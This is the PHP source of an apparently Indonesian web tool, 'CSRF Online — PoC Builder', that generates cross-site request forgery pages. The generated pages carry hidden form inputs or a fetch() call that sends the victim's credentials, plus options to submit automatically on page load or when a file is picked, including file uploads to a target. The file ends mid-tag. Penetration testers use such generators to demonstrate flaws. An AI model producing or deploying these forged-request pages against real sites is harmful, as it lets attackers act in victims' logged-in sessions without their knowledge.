<?php
function h($s) {
	return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8');
}

function valid_url($u) {
	$v = filter_var($u, FILTER_VALIDATE_URL);
	if (!$v) return false;
	$s = strtolower((string)parse_url($v, PHP_URL_SCHEME));
	return $s === 'http' || $s === 'https';
}

$action     = isset($_POST['action']) ? trim((string)$_POST['action']) : '';
$method     = isset($_POST['method']) ? strtoupper(trim($_POST['method'])) : 'POST';
$enctype    = isset($_POST['enctype']) ? trim($_POST['enctype']) : 'multipart';
$target     = isset($_POST['target']) ? trim($_POST['target']) : '_blank';
$auto       = isset($_POST['auto']);
$autoChange = isset($_POST['autochange']);

if (!in_array($method, array('GET', 'POST', 'PUT', 'PATCH', 'DELETE'), true)) $method = 'POST';
if (!in_array($enctype, array('multipart', 'urlencoded', 'json'), true)) $enctype = 'multipart';
if (!in_array($target, array('_blank', '_self'), true)) $target = '_blank';

$fields  = array();
$files   = array();
$headers = array();

if (isset($_POST['fname'], $_POST['fvalue']) && is_array($_POST['fname']) && is_array($_POST['fvalue'])) {
	foreach ($_POST['fname'] as $i => $n) {
		$n = trim((string)$n);
		if ($n === '') continue;
		$fields[] = array('name' => $n, 'value' => isset($_POST['fvalue'][$i]) ? trim((string)$_POST['fvalue'][$i]) : '');
	}
}
if (isset($_POST['files']) && is_array($_POST['files'])) {
	foreach ($_POST['files'] as $n) {
		$n = trim((string)$n);
		if ($n !== '') $files[] = $n;
	}
}
if (isset($_POST['hname'], $_POST['hvalue']) && is_array($_POST['hname']) && is_array($_POST['hvalue'])) {
	foreach ($_POST['hname'] as $i => $n) {
		$n = trim((string)$n);
		if ($n === '') continue;
		$headers[] = array('name' => $n, 'value' => isset($_POST['hvalue'][$i]) ? trim((string)$_POST['hvalue'][$i]) : '');
	}
}

function poc_style() {
	return 'body{background:radial-gradient(900px 600px at 80% -10%,rgba(167,139,250,.14),transparent 60%),radial-gradient(900px 600px at 0% 110%,rgba(34,211,238,.12),transparent 60%),#070b14;color:#e6edf3;min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center;font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;padding:24px}.box{background:rgba(255,255,255,.045);border:1px solid rgba(255,255,255,.10);border-radius:20px;padding:30px 28px;box-shadow:0 24px 60px rgba(0,0,0,.35);max-width:520px;width:100%;text-align:center;backdrop-filter:blur(18px)}label{display:block;color:#8b95a5;font-size:12px;letter-spacing:.6px;text-transform:uppercase;margin:0 0 8px}code{color:#22d3ee;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}input[type=file]{color:#e6edf3;background:rgba(13,20,34,.55);border:1px solid rgba(255,255,255,.12);border-radius:10px;padding:9px 12px;margin:6px 0;cursor:pointer}input[type=hidden]{display:none}button{background:linear-gradient(135deg,#22d3ee,#a78bfa);color:#071018;font:700 14px Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;border:0;border-radius:12px;padding:11px 22px;cursor:pointer;box-shadow:0 10px 30px rgba(34,211,238,.25);margin-top:10px}#st{color:#a78bfa;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:13px;margin-top:8px}';
}

function po_classic($action, $method, $enctype, $fields, $files, $auto, $autoChange, $target) {
	$inputs = '';
	foreach ($fields as $f) {
		$inputs .= '<input type="hidden" name="' . h($f['name']) . '" value="' . h($f['value']) . '">' . "\n";
	}
	foreach ($files as $k => $n) {
		$inputs .= '<input type="file" name="' . h($n) . '" id="f' . (int)$k . '"><br>' . "\n";
	}
	$hideBtn = ($auto && !$files) || ($autoChange && $files);
	if (!$hideBtn) {
		$inputs .= '<button type="submit">Send</button>' . "\n";
	}
	$enctypeHtml = $method === 'GET' ? '' : ' enctype="' . h($enctype === 'multipart' ? 'multipart/form-data' : 'application/x-www-form-urlencoded') . '"';
	$form = '<form id="csrf" method="' . h($method) . '" action="' . h($action) . '"' . $enctypeHtml . ' target="' . h($target) . '">' . "\n"
	       . $inputs . '</form>' . "\n";

	return '<!DOCTYPE html>' . "\n"
	     . '<html><head><meta charset="utf-8"><title>CSRF PoC</title>' . "\n"
	     . '<style>' . poc_style() . '</style>'
	     . '</head><body>' . "\n"
	     . '<div class="box">' . $form . '</div>' . "\n"
	     . '<script>'
	     . '(function(){var auto=' . ($auto ? 'true' : 'false') . ',hasFiles=' . count($files) . ',autoChange=' . ($autoChange ? 'true' : 'false') . ';'
	     . 'function sub(){var f=document.getElementById("csrf");if(f)f.submit();}'
	     . 'if(auto&&!hasFiles){window.addEventListener("load",sub);}'
	     . 'if(autoChange&&hasFiles){var fs=document.querySelectorAll("input[type=file]");for(var i=0;i<fs.length;i++){fs[i].onchange=sub;}}'
	     . '})();'
	     . '</script>'
	     . '</body></html>';
}

function po_fetch($action, $method, $enctype, $fields, $files, $headers, $auto, $autoChange) {
	$fh = '';
	foreach ($files as $k => $n) {
		$fh .= '<label>file field: <code>' . h($n) . '</code></label><br>'
		     . '<input type="file" id="f' . (int)$k . '"><br>' . "\n";
	}
	$hideBtn = ($auto && !$files) || ($autoChange && $files);
	if (!$hideBtn) {
		$fh .= '<button type="button" id="go">Send Request</button>' . "\n";
	}
	$fh .= '<p id="st"></p>';

	$entries = array();
	foreach ($fields as $f) $entries[] = array($f['name'], $f['value']);
	if ($enctype === 'urlencoded') { foreach ($files as $n) $entries[] = array($n, ''); $files = array(); }
	if ($enctype === 'multipart' && $method === 'GET') $entries = array();

	$json = function($v) { return json_encode($v, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE); };

	return '<!DOCTYPE html>' . "\n"
	     . '<html><head><meta charset="utf-8"><title>CSRF PoC</title>' . "\n"
	     . '<style>' . poc_style() . '</style>'
	     . '</head><body><div class="box">' . "\n"
	     . $fh
	     . '</div>' . "\n"
	     . '<script>'
	     . '(function(){'
	     . 'var target=' . $json($action) . ';'
	     . 'var entries=' . $json($entries) . ';'
	     . 'var files=' . $json($files) . ';'
	     . 'var headers=' . $json($headers) . ';'
	     . 'var ctype=' . $json($enctype) . ';'
	     . 'var method=' . $json($method) . ';'
	     . 'var auto=' . ($auto ? 'true' : 'false') . ';'
	     . 'var autoChange=' . ($autoChange ? 'true' : 'false') . ';'
	     . 'var sent=false;'
	     . 'function send(){'
	     . 'if(sent){return;}sent=true;'
	     . 'var hd={},i;'
	     . 'for(i=0;i<headers.length;i++){if(headers[i][0]){hd[headers[i][0]]=headers[i][1];}}'
	     . 'var opt={method:method,credentials:"include",headers:hd,body:null};'
	     . 'var url=target;'
	     . 'if(ctype==="multipart"){'
	     . 'var fd=new FormData();'
	     . 'for(i=0;i<entries.length;i++){fd.append(entries[i][0],entries[i][1]);}'
	     . 'for(i=0;i<files.length;i++){var el=document.getElementById("f"+i);if(el&&el.files&&el.files[0]){fd.append(files[i],el.files[0]);}}'
	     . 'opt.body=fd;'
	     . '}else if(method==="GET"||method==="HEAD"){'
	     . 'var q=[];for(i=0;i<entries.length;i++){q.push(encodeURIComponent(entries[i][0])+"="+encodeURIComponent(entries[i][1]));}'
	     . 'url+=(url.indexOf("?")>=0?"&":"?")+q.join("&");'
	     . '}else if(ctype==="json"){'
	     . 'if(!hd["Content-Type"]){hd["Content-Type"]="application/json";}'
	     . 'var o={};for(i=0;i<entries.length;i++){o[entries[i][0]]=entries[i][1];}'
	     . 'opt.body=JSON.stringify(o);'
	     . '}else{'
	     . 'if(!hd["Content-Type"]){hd["Content-Type"]="application/x-www-form-urlencoded";}'
	     . 'var u=new URLSearchParams();for(i=0;i<entries.length;i++){u.append(entries[i][0],entries[i][1]);}'
	     . 'opt.body=u.toString();'
	     . '}'
	     . 'fetch(url,opt).then(function(r){var s=document.getElementById("st");if(s){s.textContent="Sent: "+r.status+" "+r.statusText;}}).catch(function(e){var s=document.getElementById("st");if(s){s.textContent="Err: "+e;}});'
	     . '}'
	     . 'var go=document.getElementById("go");if(go){go.onclick=send;}'
	     . 'if(auto&&files.length===0){window.addEventListener("load",send);}'
	     . 'if(autoChange&&files.length>0){for(i=0;i<files.length;i++){(function(i){var el=document.getElementById("f"+i);if(el){el.onchange=send;}})(i);}}'
	     . '})();'
	     . '</script>'
	     . '</body></html>';
}

$poc    = '';
$errors = array();
$built  = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	if ($action === '') {
		$errors[] = 'URL Target wajib diisi.';
	} elseif (!valid_url($action)) {
		$errors[] = 'URL Target tidak valid (hanya http/https).';
	}
	if (empty($errors)) {
		$useFetch = count($headers) > 0 || $enctype === 'json' || in_array($method, array('PUT', 'PATCH', 'DELETE'), true);
		$poc = $useFetch
			? po_fetch($action, $method, $enctype, $fields, $files, $headers, $auto, $autoChange)
			: po_classic($action, $method, $enctype, $fields, $files, $auto, $autoChange, $target);
		$built = true;
	}
	if (isset($_POST['ajax']) && $_POST['ajax'] === '1') {
		header('Content-Type: application/json; charset=utf-8');
		if (!empty($errors)) {
			echo json_encode(array('ok' => false, 'errors' => $errors), JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
		} else {
			echo json_encode(array(
				'ok'         => true,
				'poc'        => $poc,
				'target'     => $action,
				'method'     => $method,
				'enctype'    => $enctype,
				'auto'       => $auto,
				'autoChange' => $autoChange,
			), JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
		}
		exit;
	}
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CSRF Online — PoC Builder by 0xfndlabs</title>
	<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2322d3ee' stroke-width='2'%3E%3Cpath d='M12 2l8 3v6c0 5-3.5 8.5-8 11-4.5-2.5-8-6-8-11V5z'/%3E%3Cpath d='M9 12l2 2 4-4'/%3E%3C/svg%3E">
	<style>
		:root{
			--bg:#070b14;
			--text:#e6edf3;
			--muted:#8b95a5;
			--accent1:#22d3ee;
			--accent2:#a78bfa;
			--glass:rgba(255,255,255,.045);
			--stroke:rgba(255,255,255,.10);
			--danger:#ff5c6c;
			--ok:#34d399;
		}
		*{box-sizing:border-box}
		html{scroll-behavior:smooth}
		body{
			margin:0;min-height:100vh;color:var(--text);
			background:radial-gradient(1000px 600px at 80% -10%,rgba(167,139,250,.14),transparent 60%),
			           radial-gradient(900px 600px at 0% 110%,rgba(34,211,238,.12),transparent 60%),
			           var(--bg);
			font:14px/1.6 "Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
			-webkit-font-smoothing:antialiased;
		}
		.blob{position:fixed;border-radius:50%;filter:blur(110px);z-index:-1;opacity:.30;pointer-events:none}
		.blob-1{width:520px;height:520px;background:#22d3ee;top:-180px;left:-140px;animation:float 20s ease-in-out infinite}
		.blob-2{width:520px;height:520px;background:#a78bfa;bottom:-200px;right:-160px;animation:float 26s ease-in-out infinite reverse}
		@keyframes float{0%,100%{transform:translate(0,0)}50%{transform:translate(50px,40px)}}
		.grid-overlay{
			position:fixed;inset:0;z-index:-1;pointer-events:none;
			background-image:linear-gradient(rgba(255,255,255,.035) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.035) 1px,transparent 1px);
			background-size:44px 44px;
			mask-image:radial-gradient(ellipse at 50% 25%,#000 15%,transparent 72%);
			-webkit-mask-image:radial-gradient(ellipse at 50% 25%,#000 15%,transparent 72%);
		}
		.wrap{width:min(1100px,100% - 32px);margin:0 auto;padding:24px 0 48px}
		header{display:flex;align-items:center;gap:14px;margin:10px 0 26px;animation:fadeUp .5s ease both}
		.brand{display:flex;align-items:center;gap:12px}
		.brand svg{width:38px;height:38px;filter:drop-shadow(0 0 12px rgba(34,211,238,.5))}
		.brand h1{margin:0;font:700 22px/1.2 "Space Grotesk",Inter,sans-serif;letter-spacing:.5px}
		.brand small{display:block;color:var(--muted);font-size:12px;font-weight:400;letter-spacing:1.5px;text-transform:uppercase}
		.badge{margin-left:auto;display:inline-flex;align-items:center;gap:7px;padding:7px 14px;border-radius:99px;font:600 12px Inter,sans-serif;letter-spacing:.4px;color:var(--text);background:var(--glass);border:1px solid var(--stroke);backdrop-filter:blur(14px)}
		.badge .dot{width:8px;height:8px;border-radius:50%;background:linear-gradient(135deg,var(--accent1),var(--accent2));box-shadow:0 0 10px var(--accent1)}
		main{display:grid;gap:16px}
		.glass{
			background:var(--glass);border:1px solid var(--stroke);border-radius:20px;padding:22px;
			backdrop-filter:blur(18px) saturate(140%);-webkit-backdrop-filter:blur(18px) saturate(140%);
			box-shadow:0 24px 60px rgba(0,0,0,.35);
			animation:fadeUp .5s ease both;
		}
		.g2{animation-delay:.06s}.g3{animation-delay:.12s}.g4{animation-delay:.18s}.g5{animation-delay:.24s}.g6{animation-delay:.30s}
		@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
		.glass h2{display:flex;align-items:center;gap:10px;margin:0 0 16px;font:600 15px "Space Grotesk",Inter,sans-serif;letter-spacing:.5px;color:var(--text)}
		.glass h2 svg{width:18px;height:18px;color:var(--accent1);flex:none}
		.layout{display:grid;grid-template-columns:1fr 1fr;gap:16px}
		.full{grid-column:1/-1}
		.field{
			width:100%;padding:10px 13px;border-radius:11px;color:var(--text);
			background:rgba(13,20,34,.55);border:1px solid var(--stroke);
			font:inherit;outline:none;transition:border-color .18s,box-shadow .18s;
		}
		.field::placeholder{color:var(--muted)}
		.field:focus{border-color:var(--accent1);box-shadow:0 0 0 3px rgba(34,211,238,.14)}
		.mon{font-family:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:13px}
		.label{display:block;font-size:12px;font-weight:600;letter-spacing:.6px;text-transform:uppercase;color:var(--muted);margin:0 0 6px}
		.seg{display:flex;gap:6px;flex-wrap:wrap}
		.seg label{position:relative;cursor:pointer}
		.seg input{position:absolute;opacity:0;pointer-events:none}
		.seg span{
			display:inline-flex;align-items:center;padding:9px 15px;border-radius:10px;font:600 13px Inter,sans-serif;
			border:1px solid var(--stroke);color:var(--muted);background:rgba(13,20,34,.55);
			transition:.18s;user-select:none;white-space:nowrap;
		}
		.seg span:hover{border-color:var(--accent1);color:var(--text)}
		.seg input:checked+span{
			background:linear-gradient(135deg,var(--accent1),var(--accent2));
			color:#071018;border-color:transparent;box-shadow:0 6px 18px rgba(34,211,238,.25);
		}
		.hint{font-size:12px;color:var(--muted);margin-top:8px}
		.hint code{background:rgba(255,255,255,.06);border:1px solid var(--stroke);border-radius:6px;padding:1px 6px;font-size:11px;color:var(--text)}
		.row-it{display:grid;gap:8px;margin-bottom:8px;animation:fadeUp .2s ease both}
		.f2{grid-template-columns:1fr 1fr auto}
		.f1{grid-template-columns:1fr auto}
		.rm{
			width:42px;border-radius:11px;cursor:pointer;display:grid;place-items:center;
			border:1px solid rgba(255,92,108,.30);background:rgba(255,92,108,.08);color:var(--danger);
			transition:.18s;
		}
		.rm:hover{background:var(--danger);color:#fff;box-shadow:0 6px 16px rgba(255,92,108,.4)}
		.rm svg{width:14px;height:14px}
		.add{
			margin-left:auto;display:inline-flex;align-items:center;gap:6px;cursor:pointer;
			padding:6px 12px;border-radius:9px;font:600 12px Inter,sans-serif;
			color:var(--accent1);background:rgba(34,211,238,.08);
			border:1px dashed rgba(34,211,238,.45);transition:.18s;
		}
		.add:hover{background:rgba(34,211,238,.16);border-style:solid}
		.rowparams{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px}
		.rowparams .wide{grid-column:1/-1}
		.opt{display:flex;align-items:center;justify-content:space-between;gap:14px;padding:12px 2px;border-bottom:1px solid rgba(255,255,255,.06)}
		.opt:last-child{border-bottom:0}
		.opt .t{font-weight:500}
		.opt .d{font-size:12px;color:var(--muted)}
		.switch{position:relative;width:46px;height:25px;flex:none;cursor:pointer}
		.switch input{opacity:0;width:0;height:0}
		.switch .sl{position:absolute;inset:0;background:rgba(255,255,255,.13);border-radius:99px;transition:.2s}
		.switch .sl:before{content:"";position:absolute;width:19px;height:19px;left:3px;top:3px;border-radius:50%;background:#fff;transition:.2s;box-shadow:0 2px 6px rgba(0,0,0,.4)}
		.switch input:checked+.sl{background:linear-gradient(135deg,var(--accent1),var(--accent2))}
		.switch input:checked+.sl:before{transform:translateX(21px)}
		.generate{
			width:100%;margin-top:18px;padding:13px;cursor:pointer;border:0;border-radius:13px;
			font:700 15px Inter,sans-serif;letter-spacing:.5px;color:#071018;
			background:linear-gradient(135deg,var(--accent1),var(--accent2));
			box-shadow:0 10px 30px rgba(34,211,238,.28);
			transition:.2s;display:flex;align-items:center;justify-content:center;gap:10px;
		}
		.generate:hover{transform:translateY(-2px);box-shadow:0 16px 40px rgba(167,139,250,.4)}
		.generate svg{width:16px;height:16px}
		.alert{
			display:flex;align-items:center;gap:10px;padding:12px 16px;border-radius:12px;margin-bottom:2px;
			background:rgba(255,92,108,.10);border:1px solid rgba(255,92,108,.35);color:#ffb3bb;font-size:13px;
			animation:fadeUp .3s ease both;
		}
		.alert svg{width:16px;height:16px;flex:none}
		#errbox{display:grid;gap:8px;margin-bottom:4px}
		.meta{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px}
		.pill{
			display:inline-flex;align-items:center;gap:6px;padding:7px 13px;border-radius:99px;
			font:600 12px Inter,sans-serif;color:var(--text);
			background:rgba(255,255,255,.06);border:1px solid var(--stroke);
		}
		.pill.mono{font-family:"JetBrains Mono",ui-monospace,SFMono-Regular,monospace;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
		.pill.warn{color:#fbbf24;border-color:rgba(251,191,36,.40);background:rgba(251,191,36,.08)}
		.pill svg{width:13px;height:13px;color:var(--accent1)}
		.src{
			width:100%;height:220px;resize:vertical;padding:14px;border-radius:14px;color:var(--text);font:12px/1.5 "JetBrains Mono",ui-monospace,monospace;
			background:rgba(9,13,22,.85);border:1px solid var(--stroke);outline:none;white-space:pre;overflow:auto;
		}
		.srcwrap{margin-top:16px}
		.srcwrap summary{cursor:pointer;display:inline-flex;align-items:center;gap:6px;font:600 12px Inter,sans-serif;color:var(--muted);user-select:none}
		.srcwrap summary:hover{color:var(--accent1)}
		.srcwrap[open] textarea{margin-top:10px}
		.acts{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
		.btn{display:inline-flex;align-items:center;gap:8px;padding:10px 16px;border-radius:11px;cursor:pointer;font:600 13px Inter,sans-serif;transition:.18s}
		.btn svg{width:14px;height:14px}
		.btn-primary{background:linear-gradient(135deg,var(--ok),#22d3ee);color:#071018;border:0;box-shadow:0 10px 24px rgba(34,211,238,.22)}
		.btn-primary:hover{transform:translateY(-1px);box-shadow:0 12px 28px rgba(52,211,153,.35)}
		.btn-ghost{background:rgba(255,255,255,.06);border:1px solid var(--stroke);color:var(--text)}
		.btn-ghost:hover{border-color:var(--accent1);color:var(--accent1)}
		.toast{margin-left:auto;font:600 12px Inter,sans-serif;color:var(--ok)}
		footer{text-align:center;margin-top:8px;color:var(--muted);font:600 12px Inter,sans-serif;letter-spacing:1px}
		footer b{color:var(--accent1)}
		.curl-warn{margin-top:18px;padding:12px 16px;border-radius:12px;font-size:12px;color:var(--muted);background:rgba(167,139,250,.07);border:1px solid rgba(167,139,250,.25)}
		@media (max-width:760px){
			.layout{grid-template-columns:1fr}
			.rowparams{grid-template-columns:1fr}
			.badge{margin-left:0}
			header{flex-wrap:wrap}
			.f2{grid-template-columns:1fr auto}
		}
	</style>
</head>
<body>
	<div class="blob blob-1"></div>
	<div class="blob blob-2"></div>
	<div class="grid-overlay"></div>

	<div class="wrap">
		<header>
			<div class="brand">
				<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" color="#22d3ee" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
					<path d="M12 2l8 3v6c0 5-3.5 8.5-8 11-4.5-2.5-8-6-8-11V5z"/><path d="M9 12l2 2 4-4"/>
				</svg>
				<div>
					<h1>CSRF Online</h1>
					<small>Proof-of-Concept Builder</small>
				</div>
			</div>
			<span class="badge"><span class="dot"></span>Coded by 0xfndlabs</span>
		</header>

		<main>
			<?php if (!empty($errors)): ?>
				<?php foreach ($errors as $e): ?>
					<div class="alert">
						<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
						<?php echo h($e); ?>
					</div>
				<?php endforeach; ?>
			<?php endif; ?>

			<form method="post" id="builder">

				<section class="glass g1 full">
					<h2>
						<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
						Endpoint
					</h2>
					<div class="rowparams">
						<div class="wide">
							<label class="label" for="action">URL Target</label>
							<input type="url" id="action" name="action" class="field mon" required placeholder="http://site.com/upload.php" value="<?php echo h($action); ?>">
						</div>
						<div>
							<label class="label">Method</label>
							<div class="seg">
								<?php foreach (array('POST', 'GET', 'PUT', 'PATCH', 'DELETE') as $m): ?>
									<label>
										<input type="radio" name="method" value="<?php echo $m; ?>" <?php echo $method === $m ? 'checked' : ''; ?>>
										<span><?php echo $m; ?></span>
									</label>
								<?php endforeach; ?>
							</div>
						</div>
						<div>
							<label class="label">Content Type</label>
							<div class="seg">
								<label><input type="radio" name="enctype" value="multipart" <?php echo $enctype === 'multipart' ? 'checked' : ''; ?>><span>Multipart</span></label>
								<label><input type="radio" name="enctype" value="urlencoded" <?php echo $enctype === 'urlencoded' ? 'checked' : ''; ?>><span>URL-Encoded</span></label>
								<label><input type="radio" name="enctype" value="json" <?php echo $enctype === 'json' ? 'checked' : ''; ?>><span>JSON</span></label>
							</div>
						</div>
					</div>
					<div class="hint">
						Gunakan <code>Multipart</code> untuk upload file. GET / JSON / header custom / PUT/PATCH/DELETE otomatis memakai mode fetch (JS).
					</div>
				</section>

				<section class="glass g2">
					<h2>
						<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="6" x2="20" y2="6"/><line x1="4" y1="12" x2="14" y2="12"/><line x1="4" y1="18" x2="9" y2="18"/><circle cx="16" cy="14" r="3"/><path d="M16 11v6"/><path d="M13 14h6"/></svg>
						Fields
						<button type="button" class="add" onclick="addRow('frows')"><span>+ Add</span></button>
					</h2>
					<div>
						<label class="label">Parameter body / query (name &amp; value)</label>
						<div id="frows">
							<?php foreach ($fields as $f): ?>
								<div class="row-it f2">
									<input class="field mon" name="fname[]" placeholder="Field name" value="<?php echo h($f['name']); ?>">
									<input class="field" name="fvalue[]" placeholder="Value" value="<?php echo h($f['value']); ?>">
									<button type="button" class="rm" title="Hapus"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><line x1="6" y1="6" x2="18" y2="18"/><line x1="18" y1="6" x2="6" y2="18"/></svg></button>
								</div>
							<?php endforeach; ?>
						</div>
					</div>
				</section>

				<section class="glass g3">
					<h2>
						<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><path d="M12 13v4"/><path d="M10 15h4"/></svg>
						Upload Fields
						<button type="button" class="add" onclick="addRow('filerows')"><span>+ Add</span></button>
					</h2>
					<div>
						<label class="label">Nama field file sesuai target</label>
						<div id="filerows">
							<?php foreach ($files as $n): ?>
								<div class="row-it f1">
									<input class="field mon" name="files[]" placeholder="mis. file / Filedata / file[]" value="<?php echo h($n); ?>">
									<button type="button" class="rm" title="Hapus"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><line x1="6" y1="6" x2="18" y2="18"/><line x1="18" y1="6" x2="6" y2="18"/></svg></button>
								</div>
							<?php endforeach; ?>
						</div>
					</div>
				</section>

				<section class="glass g4 full">
					<h2>
						<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16.5 9.4 7.55 18.35a2 2 0 0 1-2.83-2.83L13.6 6.6l3.9 1.3-3.9 3.9"/><path d="M16.5 9.4l2.13 2.13a2 2 0 0 1-2.83 2.83L13.6 12.4"/><path d="m21 3-3.6 3.6"/></svg>
						Custom Headers
						<button type="button" class="add" onclick="addRow('hrows')"><span>+ Add</span></button>
					</h2>
					<div id="hrows">
						<?php foreach ($headers as $hdr): ?>
							<div class="row-it f2">
								<input class="field mon" name="hname[]" placeholder="Header name" value="<?php echo h($hdr['name']); ?>">
								<input class="field mon" name="hvalue[]" placeholder="Header value" value="<?php echo h($hdr['value']); ?>">
								<button type="button" class="rm" title="Hapus"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><line x1="6" y1="6" x2="18" y2="18"/><line x1="18" y1="6" x2="6" y2="18"/></svg></button>
							</div>
						<?php endforeach; ?>
					</div>
				</section>

				<section class="glass g5 full">
					<h2>
						<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09a1.65 1.65 0 0 0-1-1.51 1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09a1.65 1.65 0 0 0 1.51-1 1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33h.09c.64 0 1.17-.43 1.32-1.04V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82v.09c0 .64.43 1.17 1.04 1.32H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
						Perilaku
					</h2>
					<div class="opt">
						<div>
							<div class="t">Auto-submit on load</div>
							<div class="d">PoC langsung jalan tanpa klik — hanya jika tanpa file.</div>
						</div>
						<label class="switch">
							<input type="checkbox" name="auto" <?php echo $auto ? 'checked' : ''; ?>>
							<span class="sl"></span>
						</label>
					</div>
					<div class="opt">
						<div>
							<div class="t">Auto-submit saat file dipilih</div>
							<div class="d">Request terkirim begitu file dipilih (onchange).</div>
						</div>
						<label class="switch">
							<input type="checkbox" name="autochange" <?php echo $autoChange ? 'checked' : ''; ?>>
							<span class="sl"></span>
						</label>
					</div>
					<div class="opt">
						<div>
							<div class="t">Buka di target</div>
							<div class="d">Tab baru atau tab yang sama untuk form klasik.</div>
						</div>
						<div class="seg">
							<label><input type="radio" name="target" value="_blank" <?php echo $target === '_blank' ? 'checked' : ''; ?>><span>Tab baru</span></label>
							<label><input type="radio" name="target" value="_self" <?php echo $target === '_self' ? 'checked' : ''; ?>><span>Tab sama</span></label>
						</div>
					</div>
					<button type="submit" class="generate">
						<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
						Generate PoC
					</button>
				</section>

			</form>

			<div id="errbox"></div>

			<section class="glass g6 full" id="result" <?php echo $built ? '' : 'hidden'; ?>>
				<h2>
					<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m9 11 3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg>
					PoC Generated
				</h2>

				<div class="meta">
					<span class="pill"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="6" x2="12" y2="12"/><line x1="12" y1="12" x2="16" y2="14"/></svg><span id="r-method"><?php echo $built ? h($method) : ''; ?></span></span>
					<span class="pill"><span id="r-enctype"><?php echo $built ? ($enctype === 'multipart' ? 'multipart/form-data' : ($enctype === 'json' ? 'application/json' : 'application/x-www-form-urlencoded')) : ''; ?></span></span>
					<span class="pill mono" title="Target"><span id="r-target"><?php echo $built ? h($action) : ''; ?></span></span>
					<span class="pill warn" id="r-auto" <?php echo ($built && ($auto || $autoChange)) ? '' : 'hidden'; ?>>auto-submit</span>
				</div>

				<div class="acts">
					<button type="button" class="btn btn-primary" onclick="openPoc()">
						<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
						Buka di tab baru
					</button>
					<button type="button" class="btn btn-ghost" onclick="downloadPoC()">
